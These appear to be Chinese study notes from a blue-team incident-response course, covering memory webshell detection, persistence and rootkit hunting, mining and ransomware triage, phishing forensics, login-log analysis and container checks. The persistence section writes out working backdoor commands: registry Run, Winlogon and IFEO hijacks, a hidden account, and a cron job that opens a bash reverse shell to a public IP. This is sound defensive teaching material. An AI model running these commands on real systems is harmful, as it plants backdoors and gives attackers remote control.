## 前言

红队认知解决的是「怎么进去」，蓝队技能解决的是「进去之后怎么看得见、说得清」。

两者的思维差别在责任范围：红队对一个点负责，打进去就算赢；蓝队要对一整条链负责——哪台机器、几点几分、从哪个入口、用了什么工具、横向到哪、留了什么后门、怎么处置、报告怎么写。少一环都算没结案。

## 知识主线

11 篇其实是一条闭环链：

> 先有三只眼睛（日志、流量、主机）→ 用五条思路定位入口 → 靠特征定性是什么 → 查持久化定范围 → 按顺序处置 → 写复盘

前期篇章是纵向按「攻击类型」切（Web、内存马、C2、挖矿、勒索、钓鱼、内网、容器），后期会把它们压平成同一个方法论。真正该记住的不是具体命令，而是**每个环节"看什么、凭什么下结论"**。

## 分板块笔记

### 1. 看见的三只眼（1）

蓝队第一件事不是查杀，是搞清楚「这台机器上有什么数据可看」：

- **日志层**：Web（IIS / Apache / Tomcat / Nginx）、系统、数据库（MySQL / MSSQL / Oracle / PG）各有各的路径和字段。
- **流量层**：全流量设备或 NDR，抓下来再分析。
- **主机层**：进程、网络连接、启动项、服务、计划任务、内存。

一个必须先知道的坑：**Web 日志基本不存 POST body**。也就是说光看日志永远还原不了攻击载荷长什么样，只能看到"谁在什么时候请求了哪个路径、返回什么状态码"。想看具体打了什么包，必须靠流量设备或者事后抓包。这也解释了为什么蓝队一定要有流量侧能力，不能只做日志分析。

**定位入口的五条思路**，按可靠性排序大致是：时间节点筛选 → 漏洞特征筛选（按已知漏洞的攻击路径反查日志）→ 后门查杀结果反查访问记录 → 文件修改时间（mtime 异常是最硬的证据之一）→ 流量设备数据包分析。

Webshell 查杀这一层的工具都是老面孔：D 盾管 Windows 落地文件，河马、阿里伏魔、百度 WEBDIR+、牧云 CloudWalker 管在线扫描。但这些都是**文件级**的，对内存马全部无效——这是后面三篇要解决的问题。

流量侧则要能解密。哥斯拉、冰蝎这类工具有固定密钥和加密结构，Shiro、各类 OA 的自定义加密也都有已知算法，`DecryptTools` 和 `BlueTeamTools` 这类项目就是把密文还原成明文请求，还原出来才能看清攻击者到底执行了什么。

### 2. 后门的两层：文件级与内存级（2-4）

**文件级**后门靠查杀工具，**内存级**后门只能靠 JVM / 进程内存分析。这个分野是蓝队技能里最实用的一条分界线。

Java 内存马的五类谱系值得记住，因为它直接决定你用什么语法去筛：

| 类型 | 注册的东西 | 排查命令 |
|---|---|---|
| 传统 Web 应用型 | Servlet / Filter / Listener | `sc *.Servlet` / `sc *.Filter` / `sc *.Listen` |
| 框架型（Spring） | Controller / Interceptor / WebFilter | `sc * \| grep Controller` / `grep Interceptor` / `grep WebFlux` |
| 中间件型（Tomcat） | Valve 等全局组件 | `sc *.Valve` |
| 其他 | WebSocket / JSP / 线程型 / RMI 型 | 按类名与关键字 |
| Agent 型 | Hook 关键方法 | 最难查，只能靠行为与内存比对 |

工具分两档：`java-memshell-scanner` 是 JSP 脚本，丢到目标上扫，比 agent 温和；**arthas 是主力**，因为它通用、能实时看、能反编译，命令组合就三招——

```bash
mbean | grep "name=/"                 # 看 Servlet 路由
sc *.Filter / sc *.Valve              # 按类型筛已加载类
sc * | grep -i Memshell               # 按关键字筛
jad --source-only <类名>              # 反编译定性
dump <类名>                           # 落盘取证
```

关键心法：arthas 的检测逻辑本质是**「按内存马固定的后缀、类名、代码里的常见关键字（shell / os / runtime）去捞可疑类，然后逐个反编译定性」**。它不是杀毒引擎，不给结论，只缩小范围。所以先用类型筛，再用关键字筛，最后人工看源码。

**日志侧的判据极简且好用**：访问了一个不存在的路径，但日志里返回 200——因为请求被内存马拦截了，根本没走到文件系统。这一条几乎可以独立成立。

ASP.NET 那篇给的判据更硬。`w3wp.exe` 是 IIS 工作进程，内存马注入后是**没有对应磁盘文件**的程序集：

```cmd
cd C:\Windows\System32\inetsrv
appcmd list wp                          :: 拿 w3wp 的 PID
procdump -ma <PID> C:\w3wp_full.dmp     :: 抓内存
```

然后用 dnSpy 附加到进程（`调试 → 附加到进程`），看程序集列表：

- 正常 DLL：Location 指向磁盘 bin 目录或系统 .NET 目录
- 内存马程序集：**Location 为空字符串或 `<Unknown>`，无磁盘路径**

清理也简单粗暴——回收该网站对应的应用程序池（w3wp 被杀掉重建，整片内存清空），或者直接结束 w3wp 进程，IIS 收到下一个请求会自动拉起新的。这个思路和 Java 侧"重启中间件"是同一个道理：**内存马不落盘，杀掉承载它的进程就是最彻底的清除**。代价是业务中断，所以要放在取证之后。

### 3. 权限维持与内核层隐藏（5-6）

内存马解决"怎么驻留 Web 层"，权限维持解决"怎么驻留系统层"，Rootkit 解决"怎么让你看不见"。

**Windows 侧**的持久化点几乎是固定的几处，记住它们就等于拿到了主机告警清单：

```cmd
:: 自启动
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "backdoor" /D "C:\shell.exe" /F
:: 隐藏账户（末尾带 $）
net user xiaodi$ xiaodi!@#X123 /add
:: 映像劫持：打开记事本实际执行 cmd
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v debugger /d "C:\Windows\System32\cmd.exe /c calc"
:: 屏保与登录
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /d "C:\shell.exe" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /D "C:\shell.exe" /F
```

**Linux 侧**主流是 cron + 反弹：

```bash
vim /etc/.xiaodi.sh
#!/bin/bash
bash -i >& /dev/tcp/101.32.54.78/3333 0>&1

chmod +x /etc/.xiaodi.sh
vim /etc/crontab
*/1 * * * * root /etc/.xiaodi.sh
```

看到 crontab 里出现 `/dev/tcp`、`curl | bash`、陌生公网 IP，基本可以直接定性。

排查工具这一层，课程给的是「交叉验证」思路：`linpeas` 一把梭扫 Linux 并 grep 关键项；`Hawkeye`、`HRSword`、安天 `vs2` 扫 Windows；Rootkit 场景下 **`unhide` 最关键**——它专门找"被 rootkit 隐藏起来的进程和端口"。

Rootkit 的研判逻辑值得单独拎出来说，因为它反直觉：

> **`ps` 看不见、`netstat` 看不见，但独立工具能看见 —— 这个"不一致"本身就是信号。**

课程演示的 r77、Nidhogg（Windows）、Reptile（Linux）都能同时隐藏进程、网络连接、文件、注册表项。你如果只用系统自带命令，会得出"机器很干净"的错误结论。所以主机排查的正确姿势是**至少用两种独立机制的检测手段交叉比对**（系统命令 vs 内核态扫描 vs 抓包 vs 内存镜像）。

当隐藏做得很深时，往下还有三层兜底：

- **抓包**：`tcpdump -nn -i any 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0'` 只看主动外连的 SYN，绕开一切进程层隐藏
- **内存取证**：LiME 抓物理内存 → Volatility3 离线解析
- **内核追踪**：bpftrace / tracee，在内核态截行为，rootkit 藏不住

课程最后给了一条务实的应急思路：**能识别出具体 Rootkit 项目就直接下对应工具还原；识别不出来就走"找隐藏进程+隐藏网络"这条路**。别死磕原理，先恢复可见性。

### 4. 症状型事件：挖矿与勒索（7-8）

这两类的共同点是**现象极其明显**，难点不在发现，在定性和止损。

**挖矿**的症状清单可以直接当告警规则用：

- CPU 持续高位、负载高，但业务程序解释不通
- 陌生进程伪装成 `systemd` / `sshd` / `dbus` 这类系统名字
- crontab 出现陌生外网下载脚本
- 对外外联陌生矿池 IP / 域名
- 机器风扇狂转、云账单暴涨

定性靠威胁情报：拿到**进程对应的文件**、**外联的 IP / 域名**，上微步这类平台查。这一步不能省——凭 CPU 高就说是挖矿，报告会被打回。

处置顺序课程给得很明确，值得照抄：**先查重启生效项（启动项、计划任务）→ 再查入口攻击点（怎么进来的）→ 最后隔离主机阻断通信**。顺序反了会出问题：先隔离再查，攻击者留下的下载器可能被漏掉；只顾清进程不查入口，清完还会复发。

挖矿的主流入口也很固定：SSH 弱口令爆破、Redis / MongoDB 未授权、Docker API 未鉴权、老 Web 组件 RCE、npm/pypi 恶意包与篡改镜像的供应链投递。

**勒索**的判据同样一眼可辨：CPU 瞬时接近 100%（批量加密）、文件后缀被改并留下勒索信、桌面壁纸被改、应用打不开。

家族判定有五法，从易到难：加密后缀 → 桌面壁纸 / 主题 → 勒索者邮箱 → 勒索信内容 → 微步云沙箱 / 威胁情报 / 暗网论坛。另有三个勒索病毒搜索引擎（360、启明星辰 venuseye、奇安信）可直接查家族。

定完家族就能判断"有没有救"：课程演示的四个样本里，Satan、Avaddon、GonnaCry 有解密工具，WannaCry 没有。这一步的意义在于——**先确认能不能解密，再决定要不要谈止损，不然容易白花时间或者被割**。解密工具集中在 nomoreransom、emsisoft、avast 三处。

### 5. 入口型事件：鱼叉钓鱼（9）

钓鱼是唯一"受害者自己把攻击者请进来"的场景，所以研判重心在**邮件本身**，不在主机。

邮件安全四看：发信人地址、正文内容、附件、发信域名反查。真正有取证价值的是 **EML 原始源码**——不要只截图，要拿到 `.eml`：

- 看指纹：用的是哪个发送平台/工具
- 看发送 IP：服务器 IP 或攻击者 IP
- 看 Received 链与域名：定位邮件服务器
- 看是否残留个人 ID / 昵称 / 用户名：可用于社工画像

**取证五步**：拿原始 eml → 提取来源 IP、发信域名、所有超链接、附件 → **解析 SPF / DKIM / DMARC 判定是否伪造** → 展开所有短链接跳转 → 附件送沙箱/情报平台。其中 SPF/DKIM/DMARC 三项是判定"伪造发件人"的硬证据，很多蓝队报告漏这一环。

附件走沙箱（微步），文档类则看后缀：`.docm/.xlsm/.pptm/.dotm/.xltm/.potm` 是启用宏的格式，老的 `.doc/.xls/.ppt`（OLE 二进制）也能带宏。提宏的标准动作：

```bash
pip install oletools
olevba --reveal sample.docm      # 直接解析
# 或把 docm 改名 zip 解压，取 word/vbaProject.bin 再解析
olevba vbaProject.bin
```

拿到宏代码看 `AutoOpen`、`Shell`、`CreateObject`，基本就能定性。

遏制措施四条，第一条最容易被做错：**隔离受感染终端，禁止重启，内存取证优先**。重启会清掉内存里的 C2 载荷和进程信息，证据没了。后面三条是邮件侧批量撤回、封禁钓鱼域名与 IP、全员通报。

### 6. 内网侧：口令与隧道（10）

内网研判的骨架就是**登录日志 + 登录类型**这一组字段。

**Linux SSH**：CentOS/RHEL 看 `/var/log/secure`，Ubuntu/Debian 看 `/var/log/auth.log`。

```bash
grep "Failed password for" /var/log/secure | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
grep "Accepted" /var/log/secure
```

**Windows**：事件 ID **4625 失败 / 4624 成功**，登录类型是关键——**2 交互、3 网络、5 服务、10 远程桌面**。Type 3 大量出现基本等于横向移动在跑。RDP、SMB、WMI、DCOM、WinRM 全都落在这两个事件 ID 上，MSSQL 则看 SqlServer 自己的日志。

判定"爆破成功"的标准动作：同源 IP 高频 4625，紧接着出现 4624 —— 尤其要注意第一条成功的 4624 是哪个账号、什么登录类型、来自哪里，那就是被打穿的入口。

**隧道**是内网不出网场景的典型手法。课程以 ICMP 为代表（`pingtunnel`），但明确说了"DNS 或其他协议隧道处置方法一样"。识别要看两个面：

- 网络侧：ICMP 包大小恒定、目标单一、频率规律 —— 正常 ping 不会这样
- 主机侧：`tracee`（容器跑，内核态监控）、`bpftrace` 脚本、Wireshark 看 payload

处置就一句：封 IP + 防火墙限制该协议。注意课程提到的一个现实问题——**部分云厂商定制内核缺少 tracepoint 与 BTF，bpftrace 可能跑不起来**，这时候退回抓包。

### 7. 云原生容器（11）

容器的应急和主机不一样，因为它有"镜像层"这个额外维度。四个场景对应四种问题：

| 场景 | 问题本质 |
|---|---|
| 镜像被植入恶意样本 | 供应链投毒（如打包好的 xmrig 挖矿镜像） |
| 镜像本身有已知漏洞 | CVE（Shiro、Struts2 之类） |
| 高危启动方式 | `--privileged`、挂 docker.sock、挂宿主机 `/` |
| 应用服务自身漏洞 | 跑在容器里的应用被 RCE |

镜像分析三个命令就够：

```bash
docker history --no-trunc <image>              # 创建历史，看有没有 curl/wget 下载执行
docker inspect --format='{{json .Config}}' <image>   # 环境变量里常埋矿池地址
docker inspect --format='{{.GraphDriver.Data.LowerDir}}' <image>  # 落盘路径
```

基线扫描用 `trivy`（静态）和 `grype`（SCA），高危启动用 `docker inspect` 批量筛四类：Privileged=true、挂载 docker.sock、挂载 `/` `/proc` `/sys`、HostPID / HostNetwork。

如果容器里跑的是 Java 应用，内存马排查回到 arthas，`sc *Godzilla*` 这类关键字直接生效。

处置有两条路：直接删镜像（`docker rm -f` + `docker rmi`），或进 `overlay2/*/diff` 目录删恶意文件再 kill 进程。前者干净但可能影响业务，后者精准但容易残留。

### 8. 贯穿全篇的研判方法论

把 11 篇横向切开，方法论其实是同一套四问：

| 问 | 产出 | 抓手 |
|---|---|---|
| **是什么** | 事件类型 | 文件哈希 + 外联 IP 上威胁情报；勒索看后缀，挖矿看矿池，内存马看类名 |
| **从哪进** | 入口点 + 时间线 | 五条日志筛选思路，尤其文件 mtime |
| **到哪了** | 横向路径、被控账号、持久化点 | 4624 / Accepted 登录成功记录，启动项、cron、隐藏账户 |
| **怎么处置** | 止血 → 清除 → 加固 → 复盘 | 先查持久化，再查入口，最后隔离 |

还有一个必须单独记的陷阱，来自第 12 天：**状态码不能单独作为判据**。

- 网站做了容错处理（中间件规则配置），访问不存在的路径会跳转 3XX
- 网站代码里做了跳转，命中条件也会 3XX

同样是 3XX，一个代表"不存在"，一个代表"存在且被重定向"。同理，错误页面固定显示正常内容时，**访问失败也会返回 200**。做目录扫描时如果不看响应体只盯状态码，误报率会非常高；反过来做研判时，如果能识别出"这个 200 是容错页"，就能排除大量噪声。

而蓝队研判的落脚点只有两个：**这是攻击漏洞的痕迹，还是安全工具在跑**。漏扫器、资产测绘、监控探针产生的流量和真实攻击长得很像，误判的方向决定了后面所有工作有没有意义。

## 缺口

这批文档只覆盖了「应急响应」这一半。课程开头列的章节点里，另外四篇——**设备部署**（WAF / 蜜罐 / IDS / EDR / SIEM）、**流量分析**、**规则开发**（Yaml / Suricata / 监控脚本）、**溯源反制**——**目录里还没发布**。

也就是说：这批资料教的是"事件已经发生了怎么查"，不教"怎么把告警建起来让它第一时间发现"。想补监测侧，得自己去找 SIEM/EDR 的字段模型和规则写法。

另一个建议：想把研判练出来，最好把红队侧反向读一遍——第 265 天（Rootkit 反溯源）、284/285（隐匿追踪）讲的是怎么藏，知道怎么藏才知道怎么找。

## 小结

对我最有价值的三个点：

1. **「工具看得见、命令看不见」是 Rootkit 的核心信号**——主机排查永远要用两种以上独立机制交叉验证，只信 `ps` 会得出错误结论。
2. **ASP.NET 内存马的 Location 判据**——程序集无磁盘路径就一定是内存马，这一条几乎不需要额外验证，是全篇最硬的判据。
3. **处置顺序：先持久化，再入口，最后隔离**——顺序错了会复发，这是很多应急报告返工的原因。
